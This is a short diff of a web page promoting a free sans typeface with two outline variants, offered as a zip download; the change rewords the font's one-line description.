@@ -5,7 +5,7 @@ A casual modern <a href="https://github.com/qp5/FONT/raw/main/FONT.zip">Sans fon
 
 <a href="https://github.com/qp5/FONT/raw/main/FONT.zip"><img style="height: 280px; margin-bottom:-0px; margin-top:0px;" src="https://bowhip.org/img/font_thumb_publisher_card.png" alt="mobile calling application"></a> 
 
-1 Sans Typeface — includes 2 additional outline fonts.<br>
+Sans Typeface — Includes 2 additional outliner fonts.<br>
 It is simular to these Fonts:  Sego | Noto | Source Sans Pro | Open Sans<br><br>
 
 If you create fonts, please join my <a href="mailto: support@bowhip.org">font project➚</a> <br> <br><br>
